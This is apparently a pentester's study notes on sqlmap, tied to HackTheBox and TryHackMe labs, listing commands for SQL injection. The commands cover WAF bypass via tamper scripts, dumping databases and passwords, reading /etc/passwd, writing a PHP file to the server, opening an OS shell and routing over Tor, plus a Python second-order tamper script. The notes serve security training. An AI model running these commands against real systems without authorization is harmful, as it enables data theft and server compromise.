# SQLMap

[![sqlmapessentials](../../../_badges/htb/sqlmapessentials.svg)](https://academy.hackthebox.com/course/preview/sqlmap-essentials)
[![sqlilab](../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![adventofcyber2](../../../_badges/thm/adventofcyber2/day5.svg)](https://tryhackme.com/room/adventofcyber2)
[![ccpentesting](../../../_badges/thm-p/ccpentesting.svg)](https://tryhackme.com/room/ccpentesting)

<div class="row row-cols-lg-2"><div>

[sqlmap](https://github.com/sqlmapproject/sqlmap) <small>(30.2k ‚≠ê)</small> is a tool to detect and automatically exploit [SQLi](/cybersecurity/red-team/s3.exploitation/vulns/injection/sqli.md). While it may perform just fine out of the box, we will have to configure it adequately for complex targets to avoid false negatives.

```shell!
$ sudo apt install -y sqlmap
```

To ensure the request <small>(such as a POST request)</small> is correct, we usually capture it using a tool such as [Burp Intruder](/cybersecurity/red-team/tools/utilities/proxies/burp/index.md) or from a web browser network tab, by right-clicking on the request and selecting `Copy value as cURL`.  This ensures headers and cookies are properly configured.
</div><div>

**Where to learn?** üéì

* [Official Documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage) (üìö)
* [SQLMap CheatSheet](https://www.daronwolff.com/sqlmap-cheetsheet/) (2020)
* [SQLMap CheatSheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) (2017)
</div></div>

<hr class="sep-both">

## Basic Overview

[![sqlilab](../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![adventofcyber2](../../../_badges/thm/adventofcyber2/day5.svg)](https://tryhackme.com/room/adventofcyber2)
[![sqlmapessentials](../../../_badges/htb/sqlmapessentials.svg)](https://academy.hackthebox.com/course/preview/sqlmap-essentials)

<div class="row row-cols-lg-2"><div>

To use the tool, we must first find a potentially vulnerable form/URL.

```ps
$ sqlmap -u example.com/?id=1 [...]              # GET
$ sqlmap -u example.com --data="id=1&p=0" [...]  # POST
$ sqlmap -u example.com --data-raw "id=1" [...]  # POST (cURL)
$ sqlmap -u URL --data="id=1" --method PUT [...] # PUT
$ sqlmap [...] -H 'Cookie: id=1' # add a header
$ sqlmap [...] --cookie='id=1'   # add a cookie
# see also: --host, --referer, -A/--user-agent, --mobile
```

After that, the tool will ask us a few questions to configure itself. We can skip them and use default values using `--batch`.

```ps
$ sqlmap [...] --batch
```

To configure the exploitation of a detected SQLi, [refer to this](#sqlmap-exploitation).
</div><div>

**Configuration** üêçÔ∏è

* `--parse-errors`: display DBMS errors in sqlmap output
* `-t /tmp/log.txt`: save sqlmap traffic to a file
* `-v n`: set the verbosity (0-6)
* `--threads n`: use $n$ threads
* `--flush-session`: clear cache

**Security bypass** üîè

* `--random-agent`: bypass some WAF/...
* `--csrf-token="xxx"`: indicate a non-standard CSRF cookie
* `--randomize=xxx`: randomize values for parameter `xxx`
* `--eval="xxx=5"`: python code to compute parameter `xxx`
* `--chunked`: split the request in chunks <small>(if supported, e.g. ASP)</small>
</div></div>

<hr class="sep-both">

## SQLMap Tuning

<div class="row row-cols-lg-2"><div>

#### Explicit Vulnerable Parameters

You can specify which parameters are likely to be vulnerable using `-p` or by adding `*` after the parameter value.

```ps
$ sqlmap [...] -p id
$ sqlmap [...] --data "id=1*" # same
```

<br>

#### Explicit DBMS

You can use `--dbms=some_dbms` to explicitly inform sqlmap that you know the DBMS. Example value: `sqlite`.

<br>

#### Tamper Scripts

We can use pre-written Python scripts to tamper with the payload. They can be used to-bypass WAF or other security solutions.

```ps
$ sqlmap --list-tampers
$ sqlmap [...] --tamper=between,randomcase
```
</div><div>

#### Select SQLi Techniques

You can define which SQLi technique sqlmap will try:

```ps
$ sqlmap [...] --technique=BEU # Boolean Error Union
```

<br>

#### Vectors And Boundaries

Every payload is the concatenation of a vector and a boundary <small>(prefix+suffix)</small>. For instance, `<vector>-- -` with `-- -` the suffix. 

```ps
$ sqlmap [...] --prefix="" --suffix="-- -" # example
```

To increase the set of vectors/boundaries tested, we use `--level`:

```ps
$ sqlmap [...] --level 5 # from 1 to 5, default 1
```

We may also increase the number of vectors/boundaries tested by increasing the risk of database entry loss or other problems.

```ps
$ sqlmap [...] --risk 3 # from 1 to 3, default 1
```

‚ö†Ô∏è Risky situations are when the SQL is using an Update/Delete.
</div></div>

<hr class="sep-both">

## SQLMap Exploitation

<div class="row row-cols-lg-2"><div>

#### Dumping Information

The may want to get some data before dumping the database.

```ps
$ sqlmap [...] --dump [...]
```

We also have switches for [well-known queries](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml):

* `--banner`, `--hostname`: host information
* `--dbs`, `--current-db`: display all databases
* `--schema`: database schema
* `--tables`: display tables
* `--column`: display columns
* See also: `--passwords`, `--is-dba`, `--current-user`

We can search for tables/columns using `--search`:

```ps
$ sqlmap [...] --search -T user # tables "*user*"
$ sqlmap [...] --search -C pass # columns "*pass*"
```

üìö See also the switch `--all`.

<br>

#### Read/Write files

It's possible to use SQLi to [read/write files](/cybersecurity/red-team/s3.exploitation/vulns/injection/sqli.md#sqli-filesystem-attacks). This privilege is often only allowed to the DBA (`--is-dba/--privileges => secure file priv`).

```ps
$ sqlmap [...] --file-read "/etc/passwd"
$ sqlmap [...] --file-write "xxx.php" --file-dest "/tmp/xxx.php"
```
</div><div>

#### Dumping Records

The most common usage is to dump data.

```ps
$ sqlmap [...] --dump [...]
```

As this may involve a lot of data, we often fine-tune the extraction:

* `-D xxx`: only keep database `xxx`
* `-T xxx`: only keep table `xxx`
* `-C xx, yy`: only keep columns `xx`, and `yy`
* `--start=n`/`--stop=m`: rows to select (`[n,m]`)
* `--where="attr LIKE '%'"`: filter rows

üëâ You can use `--dump-all` to dump everything in the database, but you might also want to use `--exclude-sysdbs`.

‚ö†Ô∏è Add `--no-cast` to ensure the values are the correct ones.

üìö You can select the dump format using `--dump-format`.

üìö Use `--fresh-queries` to only display the new/updated records.
<br>

#### Operating System Shell

If we can upload files, we can use sqlmap to pop a remote shell.

```ps
$ sqlmap [...] --os-shell
```

We may have to set the technique manually to ease sqlmap job.
</div></div>

<hr class="sep-both">

## Random Notes

<div class="row row-cols-lg-2"><div>

#### Load Request From A File

Assuming you caught a request, such as below:

```ps
$ cat request1.req
HTTP / HTTP/1.0
Host: www.example.com

{
  "id": 1
}
```

You can load it inside sqlmap using `-r`:

```ps
$ sqlmap -r /path/to/request.req [...]
```

üëâ See also: [Burp Intruder](/cybersecurity/red-team/tools/utilities/proxies/burp/index.md) <small>(save a request using "Save Item")</small>.
</div><div>

#### Using A Proxy

The following options might be handy:

* `--proxy="value"`: use a proxy for requests
* `--proxy-file`: use a list of proxies
* `--tor`: try to use TOR Socks proxy
* `--check-tor`: test if TOR is correctly configured

#### Uncommon Techniques Switches

* `--code=200`: use status code for "YES" in boolean-based attacks
* `--titles`: use diff in titles for boolean-based attacks
* `--string=xxx`: use this string for "YES" in boolean-based attacks
* `--text-only`: remove all HTML and compare the text content
* `--union-cols=n`: increase the likelihood of a successful union-based attack by explicitly adding the number of columns (guess/...).
* `--union-char='a'`: dummy value for union
</div></div>

<hr class="sep-both">

## Second Order SQLi with SQLMap

[![sqlilab](../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![second_order_injection_sqlmap](../../../_badges/hacktricks/pentesting_web/sql_injection/sqlmap/second_order_injection_sqlmap.svg)](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap)

<div class="row row-cols-lg-2"><div>

We can perform some [Second Order SQLi](/cybersecurity/red-team/s3.exploitation/vulns/injection/sqli.md#second-order-sqli-attack) attacks using `sqlmap`. We would have to write a custom tamper script.

```ps
$ touch __init__.py
$ touch myscript.py
$ sqlmap --url 'URL/signup' --second-url 'URL/invoices' --tamper myscript.py --data "username=*&password="
```

* The `--data` is associated with `--url`
* The `--second-url` is where we may see the in-band SQLi results

Refer to [hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap) to write your tamper script.
</div><div>

```py
#!/usr/bin/env python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def login_account(payload):
    with requests.Session() as s:
        s.post("http://example.com/signup", data={"username": payload, "password": "noonecare"})
        s.post("http://example.com/login", data={"username": payload, "password": "noonecare"})
        session_id = s.cookies.get("COOKIE_NAME", None)
    return "COOKIE_NAME={}".format(session_id)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["Cookie"] = login_account(payload)
    return payload
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Automatic parameter finding

* `--crawl`
* `--forms`
* `-g`

Out-of-band

* `--dns-domain="..."`
</div><div>

Output

* `Content is stable`: no major changes in output
* `... dynamic`: different parameters lead to different responses
* `... reflective`: parameter is present in the output
</div></div>